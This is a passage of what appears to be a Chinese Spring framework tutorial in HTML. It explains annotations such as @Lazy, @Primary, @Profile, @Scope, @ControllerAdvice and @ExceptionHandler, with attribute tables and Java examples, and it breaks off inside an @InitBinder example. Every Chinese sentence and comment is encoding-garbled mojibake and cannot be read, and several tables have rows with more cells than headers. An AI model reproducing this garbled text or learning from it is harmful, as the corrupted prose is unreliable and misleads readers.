<p><code>@Lazy</code> ç”¨äºæ ‡è®° Bean ä¸ºæ‡’åŠ è½½ï¼Œå³ä»…å½“é¦–æ¬¡è·å– Bean æ—¶æ‰åˆå§‹åŒ–ï¼Œ
è€Œéå®¹å™¨å¯åŠ¨æ—¶ã€‚</p>
<ul>
<li>ä»…å¯¹å•ä¾‹ Bean ç”Ÿæ•ˆï¼ˆåŸå‹ Bean é»˜è®¤æ‡’åŠ è½½ï¼‰ï¼›</li>
<li>å¯æ ‡æ³¨åœ¨<code>@Configuration</code>ç±»ä¸Šï¼Œæ‰¹é‡è®¾ç½®è¯¥ç±»ä¸­<code>@Bean</code>çš„æ‡’åŠ è½½ã€‚</li>
</ul>
<p><strong>å±æ€§è¯´æ˜ï¼š</strong></p>














<table><thead><tr><th>å±æ€§</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>value</td><td>æ˜¯å¦æ‡’åŠ è½½</td><td>â‘  <code>true</code>ï¼ˆé»˜è®¤ï¼‰ï¼šæ‡’åŠ è½½ï¼›â‘¡ <code>false</code>ï¼šç«‹å³åŠ è½½</td></tr></tbody></table>
<p><strong>ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LazyConfig</span> {
 Â  <span class="hljs-comment">// æ‡’åŠ è½½Beanï¼Œé¦–æ¬¡è°ƒç”¨æ—¶åˆå§‹åŒ–</span>
 Â  <span class="hljs-meta">@Bean</span>
 Â  <span class="hljs-meta">@Lazy(true)</span>
 Â  <span class="hljs-keyword">public</span> HeavyService <span class="hljs-title function_">heavyService</span><span class="hljs-params">()</span> {
 Â  Â  Â  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HeavyService</span>(); <span class="hljs-comment">// åˆå§‹åŒ–è€—æ—¶è¾ƒé•¿çš„Bean</span>
 Â  }
}
</code></pre>
<h3 data-id="heading-15">15. @Primary</h3>
<p><code>@Primary</code> æ ‡è®° Bean ä¸º â€œä¸» Beanâ€ï¼Œå½“å­˜åœ¨å¤šä¸ªåŒç±»å‹ Bean æ—¶ï¼Œ<code>@Autowired</code>ä¼˜å…ˆæ³¨å…¥è¯¥ Beanã€‚</p>
<ul>
<li>é€‚ç”¨åœºæ™¯ï¼šè§£å†³å¤š Bean è‡ªåŠ¨è£…é…å†²çªï¼Œå¦‚é»˜è®¤æ•°æ®æºã€é»˜è®¤ç¼“å­˜ç®¡ç†å™¨ã€‚</li>
</ul>
<p><strong>ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PrimaryConfig</span> {
 Â  <span class="hljs-meta">@Bean</span>
 Â  <span class="hljs-meta">@Primary</span> <span class="hljs-comment">// ä¸»æ•°æ®æºï¼Œ@Autowiredä¼˜å…ˆæ³¨å…¥</span>
 Â  <span class="hljs-keyword">public</span> DataSource <span class="hljs-title function_">primaryDataSource</span><span class="hljs-params">()</span> {
 Â  Â  Â  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DruidDataSource</span>();
 Â  }
 Â  <span class="hljs-meta">@Bean</span>
 Â  <span class="hljs-keyword">public</span> DataSource <span class="hljs-title function_">secondaryDataSource</span><span class="hljs-params">()</span> {
 Â  Â  Â  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HikariDataSource</span>();
 Â  }
}
<span class="hljs-comment">// ä½¿ç”¨æ—¶ï¼Œè‡ªåŠ¨æ³¨å…¥primaryDataSource</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> {
 Â  <span class="hljs-meta">@Autowired</span>
 Â  <span class="hljs-keyword">private</span> DataSource dataSource; <span class="hljs-comment">// æ³¨å…¥primaryDataSource</span>
}
</code></pre>
<h3 data-id="heading-16">16. @Profile</h3>
<p><code>@Profile</code> ç”¨äºæŒ‰ç¯å¢ƒåŠ è½½ Beanï¼Œä»…å½“æŒ‡å®šç¯å¢ƒæ¿€æ´»æ—¶ï¼Œæ‰åŠ è½½æ ‡æ³¨çš„ Beanã€‚</p>
<ul>
<li>å¸¸ç”¨ç¯å¢ƒï¼š<code>dev</code>ï¼ˆå¼€å‘ï¼‰ã€<code>test</code>ï¼ˆæµ‹è¯•ï¼‰ã€<code>prod</code>ï¼ˆç”Ÿäº§ï¼‰ï¼›</li>
<li>æ¿€æ´»æ–¹å¼ï¼šé€šè¿‡<code>spring.profiles.active</code>é…ç½®ï¼ˆå¦‚<code>application.yml</code>ä¸­è®¾ç½®ï¼‰ã€‚</li>
</ul>
<p><strong>å±æ€§è¯´æ˜ï¼š</strong></p>














<table><thead><tr><th>å±æ€§</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>value</td><td>ç¯å¢ƒåç§°æ•°ç»„</td><td>å¦‚<code>value = {"dev", "test"}</code></td></tr></tbody></table>
<p><strong>ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProfileConfig</span> {
 Â  <span class="hljs-comment">// å¼€å‘ç¯å¢ƒæ•°æ®æº</span>
 Â  <span class="hljs-meta">@Bean</span>
 Â  <span class="hljs-meta">@Profile("dev")</span>
 Â  <span class="hljs-keyword">public</span> DataSource <span class="hljs-title function_">devDataSource</span><span class="hljs-params">()</span> {
 Â  Â  Â  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EmbeddedDatabaseBuilder</span>().setType(EmbeddedDatabaseType.H2).build();
 Â  }
 Â  <span class="hljs-comment">// ç”Ÿäº§ç¯å¢ƒæ•°æ®æº</span>
 Â  <span class="hljs-meta">@Bean</span>
 Â  <span class="hljs-meta">@Profile("prod")</span>
 Â  <span class="hljs-keyword">public</span> DataSource <span class="hljs-title function_">prodDataSource</span><span class="hljs-params">()</span> {
 Â  Â  Â  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DruidDataSource</span>();
 Â  }
}
</code></pre>
<h3 data-id="heading-17">17. @PropertySource</h3>
<p><code>@PropertySource</code> ç”¨äºåŠ è½½è‡ªå®šä¹‰é…ç½®æ–‡ä»¶ï¼Œå°†é…ç½®é¡¹çº³å…¥ Spring çš„ Environment ç®¡ç†ã€‚</p>
<ul>
<li>æ ¸å¿ƒç‰¹æ€§ï¼šæ”¯æŒå¤šç§ç¼–ç ã€å¿½ç•¥ä¸å­˜åœ¨çš„æ–‡ä»¶ï¼Œé…åˆ<code>@Value</code>æˆ–<code>@ConfigurationProperties</code>ä½¿ç”¨ã€‚</li>
</ul>
<p><strong>å±æ€§è¯´æ˜ï¼š</strong></p>



































<table><thead><tr><th>å±æ€§</th><th>è¯´æ˜</th><th>è¡¥å……è¯´æ˜</th></tr></thead><tbody><tr><td>name</td><td>PropertySource åç§°</td><td>è‡ªå®šä¹‰åç§°ï¼Œå¦‚<code>name = "customProperties"</code></td></tr><tr><td>value</td><td>é…ç½®æ–‡ä»¶è·¯å¾„</td><td>å¦‚<code>value = "classpath:app-custom.properties"</code></td></tr><tr><td>ignoreResourceNotFound</td><td>æ˜¯å¦å¿½ç•¥ä¸å­˜åœ¨çš„æ–‡ä»¶</td><td>â‘  <code>true</code>ï¼šå¿½ç•¥ï¼›â‘¡ <code>false</code>ï¼ˆé»˜è®¤ï¼‰ï¼šæ–‡ä»¶ä¸å­˜åœ¨åˆ™æŠ›å¼‚å¸¸</td></tr><tr><td>encoding</td><td>é…ç½®æ–‡ä»¶ç¼–ç </td><td>å¦‚<code>encoding = "UTF-8"</code></td></tr><tr><td>factory</td><td>è‡ªå®šä¹‰é…ç½®æ–‡ä»¶è¯»å–å·¥å‚</td><td>éœ€å®ç°<code>PropertySourceFactory</code>ï¼Œæ”¯æŒ YAML ç­‰é properties æ–‡ä»¶</td></tr></tbody></table>
<p><strong>ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@PropertySource(
 Â  value = "classpath:app-custom.properties",
 Â  encoding = "UTF-8",
 Â  ignoreResourceNotFound = true
)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PropertyConfig</span> {
 Â  <span class="hljs-meta">@Value("${app.name}")</span>
 Â  <span class="hljs-keyword">private</span> String appName; <span class="hljs-comment">// è¯»å–app-custom.propertiesä¸­çš„app.name</span>
}
</code></pre>
<h3 data-id="heading-18">18. @Role</h3>
<p><code>@Role</code> å®šä¹‰ Bean çš„è§’è‰²ï¼Œç”¨äºåŒºåˆ† Bean çš„ç”¨é€”ï¼ˆæ¡†æ¶å†…éƒ¨ / åº”ç”¨å±‚ï¼‰ã€‚</p>
<ul>
<li><code>BeanDefinition.ROLE_APPLICATION</code>ï¼ˆé»˜è®¤ï¼‰ï¼šåº”ç”¨å±‚ Beanï¼Œå¼€å‘è€…å…³æ³¨ï¼›</li>
<li><code>BeanDefinition.ROLE_INFRASTRUCTURE</code>ï¼šæ¡†æ¶å†…éƒ¨ Beanï¼Œå¯¹å¼€å‘è€…é€æ˜ï¼›</li>
<li><code>BeanDefinition.ROLE_SUPPORT</code>ï¼šæ”¯æ’‘æ€§ Beanï¼Œè¾…åŠ©åº”ç”¨å±‚ Bean è¿è¡Œã€‚</li>
</ul>
<p><strong>å±æ€§è¯´æ˜ï¼š</strong></p>














<table><thead><tr><th>å±æ€§</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>value</td><td>è§’è‰²å€¼</td><td>å¯¹åº”ä¸Šè¿°ä¸‰ä¸ªå¸¸é‡ï¼Œå¦‚<code>value = BeanDefinition.ROLE_INFRASTRUCTURE</code></td></tr></tbody></table>
<p><strong>ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@Role(BeanDefinition.ROLE_INFRASTRUCTURE)</span> <span class="hljs-comment">// æ ‡è®°ä¸ºæ¡†æ¶å†…éƒ¨é…ç½®ç±»</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FrameworkConfig</span> {
 Â  <span class="hljs-meta">@Bean</span>
 Â  <span class="hljs-keyword">public</span> TransactionManager <span class="hljs-title function_">transactionManager</span><span class="hljs-params">()</span> {
 Â  Â  Â  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataSourceTransactionManager</span>();
 Â  }
}
</code></pre>
<h3 data-id="heading-19">19. @Scope</h3>
<p><code>@Scope</code> å®šä¹‰ Bean çš„ä½œç”¨åŸŸï¼Œå†³å®š Bean çš„ç”Ÿå‘½å‘¨æœŸèŒƒå›´ã€‚</p>
<ul>
<li><code>SCOPE_SINGLETON</code>ï¼ˆé»˜è®¤ï¼‰ï¼šå•ä¾‹ï¼Œå®¹å™¨ä¸­ä»…ä¸€ä¸ªå®ä¾‹ï¼›</li>
<li><code>SCOPE_PROTOTYPE</code>ï¼šåŸå‹ï¼Œæ¯æ¬¡è·å–åˆ›å»ºæ–°å®ä¾‹ï¼›</li>
<li><code>SCOPE_REQUEST</code>ï¼šè¯·æ±‚ä½œç”¨åŸŸï¼Œæ¯ä¸ª HTTP è¯·æ±‚ä¸€ä¸ªå®ä¾‹ï¼›</li>
<li><code>SCOPE_SESSION</code>ï¼šä¼šè¯ä½œç”¨åŸŸï¼Œæ¯ä¸ª HTTP ä¼šè¯ä¸€ä¸ªå®ä¾‹ã€‚</li>
</ul>
<p><strong>å±æ€§è¯´æ˜ï¼š</strong></p>

























<table><thead><tr><th>å±æ€§</th><th>è¯´æ˜</th><th>è¡¥å……è¯´æ˜</th></tr></thead><tbody><tr><td>value</td><td>ä½œç”¨åŸŸåç§°</td><td>ä¸<code>scopeName</code>ç­‰ä»·ï¼Œå¦‚<code>value = ScopeConstants.SCOPE_REQUEST</code></td></tr><tr><td>scopeName</td><td>ä½œç”¨åŸŸåç§°</td><td>è¯­ä¹‰æ›´æ¸…æ™°ï¼Œæ¨èä½¿ç”¨</td></tr><tr><td>proxyMode</td><td>ä»£ç†æ¨¡å¼</td><td>è§£å†³ä½œç”¨åŸŸä¾èµ–é—®é¢˜ï¼ˆå¦‚å•ä¾‹ Bean ä¾èµ–è¯·æ±‚ä½œç”¨åŸŸ Beanï¼‰ï¼Œå¯é€‰ï¼šâ‘  <code>ScopedProxyMode.NO</code>ï¼ˆé»˜è®¤ï¼‰ï¼šæ— ä»£ç†ï¼›â‘¡ <code>ScopedProxyMode.INTERFACES</code>ï¼šJDK åŠ¨æ€ä»£ç†ï¼›â‘¢ <code>ScopedProxyMode.TARGET_CLASS</code>ï¼šCGLIB ä»£ç†</td></tr></tbody></table>
<p><strong>ä½œç”¨åŸŸä¾èµ–é—®é¢˜ï¼š</strong> å•ä¾‹beanä¾èµ–è¯·æ±‚ä½œç”¨åŸŸbeanï¼Œä½†æ˜¯è¯·æ±‚ä½œç”¨åŸŸbeanï¼Œåªæœ‰åœ¨è¯·æ±‚æ—¶æ‰ä¼šäº§ç”Ÿï¼Œè€Œå•ä¾‹beanåœ¨å¯åŠ¨æ—¶ä¼šè¿›è¡Œä¾èµ–æ³¨å…¥ã€‚å¦‚æœä¸ä»£ç†åˆ™æ— æ³•æ³¨å…¥è¯·æ±‚ä½œç”¨åŸŸbean</p>
<p><strong>ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ScopeConfig</span> {
 Â  <span class="hljs-comment">// è¯·æ±‚ä½œç”¨åŸŸBeanï¼Œé€šè¿‡CGLIBä»£ç†è§£å†³ä¾èµ–é—®é¢˜</span>
 Â  <span class="hljs-meta">@Bean</span>
 Â  <span class="hljs-meta">@Scope(value = ScopeConstants.SCOPE_REQUEST, proxyMode = ScopedProxyMode.TARGET_CLASS)</span>
 Â  <span class="hljs-keyword">public</span> RequestContext <span class="hljs-title function_">requestContext</span><span class="hljs-params">()</span> {
 Â  Â  Â  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestContext</span>();
 Â  }
 Â  <span class="hljs-comment">// å•ä¾‹Beanä¾èµ–è¯·æ±‚ä½œç”¨åŸŸBeanï¼ˆé€šè¿‡ä»£ç†æ³¨å…¥ï¼‰</span>
 Â  <span class="hljs-meta">@Bean</span>
 Â  <span class="hljs-keyword">public</span> UserService <span class="hljs-title function_">userService</span><span class="hljs-params">()</span> {
 Â  Â  Â  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserService</span>(requestContext());
 Â  }
}
</code></pre>
<h3 data-id="heading-20">20. @AutoConfigureAfter / @AutoConfigureBefore / @AutoConfigureOrder</h3>
<p>è¿™ä¸‰ä¸ªæ³¨è§£ç”¨äºæ§åˆ¶<code>@Configuration</code>é…ç½®ç±»çš„åŠ è½½é¡ºåºï¼Œç±»ä¼¼<code>@DependsOn</code>ä½†é’ˆå¯¹é…ç½®ç±»è§£æé˜¶æ®µã€‚</p>
<ul>
<li>æ ¸å¿ƒåŒºåˆ«ï¼š<code>@DependsOn</code>æ§åˆ¶ Bean åˆ›å»ºé¡ºåºï¼Œè¿™ä¸‰ä¸ªæ³¨è§£æ§åˆ¶é…ç½®ç±»è§£æé¡ºåºã€‚</li>
</ul>
<p><strong>å±æ€§è¯´æ˜ï¼š</strong></p>



















<table><thead><tr><th>å±æ€§</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>name</td><td>é…ç½®ç±»å…¨é™å®šåæ•°ç»„</td><td>å¦‚<code>name = "com.example.MyBatisConfig"</code></td></tr><tr><td>value</td><td>é…ç½®ç±» Class æ•°ç»„</td><td>å¦‚<code>value = MyBatisConfig.class</code></td></tr></tbody></table>
<p><strong>ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æ•°æ®æºé…ç½®å…ˆè§£æ</span>
<span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DataSourceConfig</span> {
 Â  <span class="hljs-meta">@Bean</span>
 Â  <span class="hljs-keyword">public</span> DataSource <span class="hljs-title function_">dataSource</span><span class="hljs-params">()</span> {
 Â  Â  Â  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DruidDataSource</span>();
 Â  }
}
<span class="hljs-comment">// äº‹åŠ¡é…ç½®åœ¨æ•°æ®æºé…ç½®ä¹‹åè§£æ</span>
<span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@AutoConfigureAfter(DataSourceConfig.class)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransactionConfig</span> {
 Â  <span class="hljs-meta">@Bean</span>
 Â  <span class="hljs-keyword">public</span> TransactionManager <span class="hljs-title function_">transactionManager</span><span class="hljs-params">(DataSource dataSource)</span> {
 Â  Â  Â  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataSourceTransactionManager</span>(dataSource);
 Â  }
}
</code></pre>
<h2 data-id="heading-21">äºŒã€WebMVC ç›¸å…³æ³¨è§£</h2>
<p>WebMVC æ³¨è§£æ˜¯ Spring MVC å¤„ç†è¯·æ±‚ã€å“åº”ã€å‚æ•°ç»‘å®šã€å¼‚å¸¸å¤„ç†çš„æ ¸å¿ƒï¼Œä¸“æ³¨äº Web å±‚çš„è¯·æ±‚å¤„ç†é€»è¾‘ã€‚</p>
<h3 data-id="heading-22">1. @ControllerAdvice</h3>
<p><code>@ControllerAdvice</code> æ˜¯ â€œæ§åˆ¶å™¨å¢å¼ºå™¨â€ï¼Œå…¨å±€æ‹¦æˆª Controller çš„è¯·æ±‚å¤„ç†æµç¨‹ï¼Œé…åˆä»¥ä¸‹æ³¨è§£ä½¿ç”¨ï¼š</p>
<ul>
<li><code>@ExceptionHandler</code>ï¼šå…¨å±€å¼‚å¸¸å¤„ç†ï¼›</li>
<li><code>@InitBinder</code>ï¼šå…¨å±€å‚æ•°ç»‘å®šï¼›</li>
<li><code>@ModelAttribute</code>ï¼šå…¨å±€æ¨¡å‹å±æ€§è®¾ç½®ï¼›</li>
<li>æ‰©å±•èƒ½åŠ›ï¼šå®ç°<code>ResponseBodyAdvice</code>/<code>RequestBodyAdvice</code>ï¼Œæ‹¦æˆªè¯·æ±‚ / å“åº”å¤„ç†ã€‚</li>
</ul>
<p><strong>å±æ€§è¯´æ˜ï¼š</strong></p>

























<table><thead><tr><th>å±æ€§å</th><th>è¯´æ˜</th><th>è¡¥å……è¯´æ˜</th></tr></thead><tbody><tr><td>basePackages</td><td>æ‹¦æˆªçš„åŸºç¡€åŒ…è·¯å¾„</td><td>ä»…æŒ‡å®šåŒ…ä¸‹çš„ Controller è¢«æ‹¦æˆªï¼Œå¦‚<code>basePackages = "com.example.controller"</code></td></tr><tr><td>assignableTypes</td><td>æ‹¦æˆªçš„ Controller çˆ¶ç±» / æ¥å£</td><td>ä»…ç»§æ‰¿æŒ‡å®š Class çš„ Controller è¢«æ‹¦æˆªï¼Œå¦‚<code>assignableTypes = BaseController.class</code></td></tr><tr><td>annotations</td><td>æ‹¦æˆªçš„ Controller æ³¨è§£</td><td>ä»…æ ‡æ³¨æŒ‡å®šæ³¨è§£çš„ Controller è¢«æ‹¦æˆªï¼Œå¦‚<code>annotations = RestController.class</code></td></tr></tbody></table>
<p><strong>ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å…¨å±€å¢å¼ºå™¨ï¼Œæ‹¦æˆªæ‰€æœ‰@RestControlleræ ‡æ³¨çš„æ§åˆ¶å™¨</span>
<span class="hljs-meta">@ControllerAdvice(annotations = RestController.class)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GlobalControllerAdvice</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ResponseBodyAdvice</span>&lt;Object&gt;, RequestBodyAdvice {
 Â  <span class="hljs-comment">// å…¨å±€å¼‚å¸¸å¤„ç†</span>
 Â  <span class="hljs-meta">@ExceptionHandler(Exception.class)</span>
 Â  <span class="hljs-keyword">public</span> ResponseEntity&lt;ErrorResponse&gt; <span class="hljs-title function_">handleException</span><span class="hljs-params">(Exception e)</span> {
 Â  Â  Â  <span class="hljs-type">ErrorResponse</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorResponse</span>(HttpStatus.INTERNAL_SERVER_ERROR.value(), e.getMessage());
 Â  Â  Â  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResponseEntity</span>&lt;&gt;(response, HttpStatus.INTERNAL_SERVER_ERROR);
 Â  }
 Â  <span class="hljs-comment">// å…¨å±€å‚æ•°ç»‘å®šï¼ˆæ—¥æœŸæ ¼å¼ï¼‰</span>
 Â  <span class="hljs-meta">@InitBinder</span>
 Â  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initBinder</span><span class="hljs-params">(WebDataBinder binder)</span> {
 Â  Â  Â  <span class="hljs-type">SimpleDateFormat</span> <span class="hljs-variable">sdf</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleDateFormat</span>(<span class="hljs-string">"yyyy-MM-dd HH:mm:ss"</span>);
 Â  Â  Â  binder.registerCustomEditor(Date.class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomDateEditor</span>(sdf, <span class="hljs-literal">true</span>));
 Â  }
 Â  <span class="hljs-comment">// å…¨å±€æ¨¡å‹å±æ€§</span>
 Â  <span class="hljs-meta">@ModelAttribute</span>
 Â  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addGlobalModelAttribute</span><span class="hljs-params">(Model model)</span> {
 Â  Â  Â  model.addAttribute(<span class="hljs-string">"appName"</span>, <span class="hljs-string">"SpringMVC Demo"</span>);
 Â  }
 Â  <span class="hljs-comment">// æ‹¦æˆª@ResponseBodyå“åº”ï¼Œè‡ªå®šä¹‰å¤„ç†</span>
 Â  <span class="hljs-meta">@Override</span>
 Â  <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">beforeBodyWrite</span><span class="hljs-params">(Object body, MethodParameter returnType, MediaType selectedContentType,
 Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Class&lt;? extends HttpMessageConverter&lt;?&gt;&gt; selectedConverterType,
 Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  ServerHttpRequest request, ServerHttpResponse response)</span> {
 Â  Â  Â  <span class="hljs-comment">// ç»Ÿä¸€å“åº”æ ¼å¼</span>
 Â  Â  Â  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Result</span>&lt;&gt;(<span class="hljs-string">"success"</span>, body);
 Â  }
 Â  <span class="hljs-comment">// æ‹¦æˆª@RequestBodyè¯·æ±‚ï¼Œè‡ªå®šä¹‰å¤„ç†</span>
 Â  <span class="hljs-meta">@Override</span>
 Â  <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">afterBodyRead</span><span class="hljs-params">(Object body, HttpInputMessage inputMessage, MethodParameter parameter,
 Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Class&lt;?&gt; targetType, Class&lt;? extends HttpMessageConverter&lt;?&gt;&gt; converterType)</span> {
 Â  Â  Â  <span class="hljs-comment">// è¯·æ±‚å‚æ•°é¢„å¤„ç†</span>
 Â  Â  Â  <span class="hljs-keyword">return</span> body;
 Â  }
 Â  <span class="hljs-comment">// å…¶ä»–æ¥å£å®ç°...</span>
}
</code></pre>
<h3 data-id="heading-23">2. @ExceptionHandler</h3>
<p><code>@ExceptionHandler</code> ç”¨äºå¤„ç† Controller ä¸­çš„å¼‚å¸¸ï¼Œå¯å±€éƒ¨ï¼ˆController å†…ï¼‰æˆ–å…¨å±€ï¼ˆé…åˆ<code>@ControllerAdvice</code>ï¼‰ä½¿ç”¨ã€‚</p>
<ul>
<li>æ ¸å¿ƒä¼˜åŠ¿ï¼šç²¾å‡†æ•è·æŒ‡å®šå¼‚å¸¸ï¼Œç»Ÿä¸€å¼‚å¸¸å“åº”æ ¼å¼ï¼Œé¿å…é‡å¤ try-catchã€‚</li>
</ul>
<p><strong>å±æ€§è¯´æ˜ï¼š</strong></p>














<table><thead><tr><th>å±æ€§å</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>value</td><td>éœ€å¤„ç†çš„å¼‚å¸¸ç±»å‹æ•°ç»„</td><td>å¦‚<code>value = {NullPointerException.class, IllegalArgumentException.class}</code></td></tr></tbody></table>
<p><strong>ç¤ºä¾‹ï¼ˆå…¨å±€å¼‚å¸¸å¤„ç†ï¼‰</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@ControllerAdvice</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GlobalExceptionHandler</span> {
 Â  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">log</span> <span class="hljs-operator">=</span> LoggerFactory.getLogger(GlobalExceptionHandler.class);
 Â  <span class="hljs-comment">// å¤„ç†ä¸šåŠ¡å¼‚å¸¸</span>
 Â  <span class="hljs-meta">@ExceptionHandler(BusinessException.class)</span>
 Â  <span class="hljs-meta">@ResponseBody</span>
 Â  <span class="hljs-keyword">public</span> Result&lt;Void&gt; <span class="hljs-title function_">handleBusinessException</span><span class="hljs-params">(BusinessException e)</span> {
 Â  Â  Â  log.warn(<span class="hljs-string">"ä¸šåŠ¡å¼‚å¸¸ï¼š{}"</span>, e.getMessage());
 Â  Â  Â  <span class="hljs-keyword">return</span> Result.fail(e.getCode(), e.getMessage());
 Â  }
 Â  <span class="hljs-comment">// å¤„ç†å‚æ•°æ ¡éªŒå¼‚å¸¸</span>
 Â  <span class="hljs-meta">@ExceptionHandler(MethodArgumentNotValidException.class)</span>
 Â  <span class="hljs-meta">@ResponseBody</span>
 Â  <span class="hljs-keyword">public</span> Result&lt;Void&gt; <span class="hljs-title function_">handleValidException</span><span class="hljs-params">(MethodArgumentNotValidException e)</span> {
 Â  Â  Â  <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> e.getBindingResult().getFieldError().getDefaultMessage();
 Â  Â  Â  log.warn(<span class="hljs-string">"å‚æ•°æ ¡éªŒå¼‚å¸¸ï¼š{}"</span>, message);
 Â  Â  Â  <span class="hljs-keyword">return</span> Result.fail(<span class="hljs-number">400</span>, message);
 Â  }
 Â  <span class="hljs-comment">// å¤„ç†æ‰€æœ‰æœªæ•è·çš„å¼‚å¸¸</span>
 Â  <span class="hljs-meta">@ExceptionHandler(Exception.class)</span>
 Â  <span class="hljs-meta">@ResponseBody</span>
 Â  <span class="hljs-meta">@ResponseStatus(HttpStatus.INTERNAL_SERVER_ERROR)</span>
 Â  <span class="hljs-keyword">public</span> Result&lt;Void&gt; <span class="hljs-title function_">handleException</span><span class="hljs-params">(Exception e)</span> {
 Â  Â  Â  log.error(<span class="hljs-string">"ç³»ç»Ÿå¼‚å¸¸"</span>, e);
 Â  Â  Â  <span class="hljs-keyword">return</span> Result.fail(<span class="hljs-number">500</span>, <span class="hljs-string">"æœåŠ¡å™¨å†…éƒ¨é”™è¯¯"</span>);
 Â  }
}
<span class="hljs-comment">// ç»Ÿä¸€å“åº”ç»“æœ</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Result</span>&lt;T&gt; {
 Â  <span class="hljs-keyword">private</span> String code;
 Â  <span class="hljs-keyword">private</span> String message;
 Â  <span class="hljs-keyword">private</span> T data;
 Â  <span class="hljs-comment">// é™æ€æ–¹æ³•ï¼šsuccess/fail...</span>
}
</code></pre>
<h3 data-id="heading-24">3. @InitBinder</h3>
<p><code>@InitBinder</code> ç”¨äºè‡ªå®šä¹‰ Web è¯·æ±‚å‚æ•°åˆ° Bean çš„ç»‘å®šè§„åˆ™ï¼Œè§£å†³ç‰¹æ®Šç±»å‹ï¼ˆå¦‚æ—¥æœŸã€æšä¸¾ï¼‰çš„å‚æ•°è½¬æ¢é—®é¢˜ã€‚</p>
<ul>
<li>ä½œç”¨åŸŸï¼šå±€éƒ¨ï¼ˆController å†…ï¼‰æˆ–å…¨å±€ï¼ˆé…åˆ<code>@ControllerAdvice</code>ï¼‰ã€‚</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼ˆå…¨å±€æ—¥æœŸå‚æ•°ç»‘å®šï¼‰</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@ControllerAdvice</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GlobalInitBinder</span> {
 Â  <span class="hljs-comment">// ç»‘å®šå¤šç§æ—¥æœŸæ ¼å¼</span>
 Â  <span class="hljs-meta">@InitBinder</span>
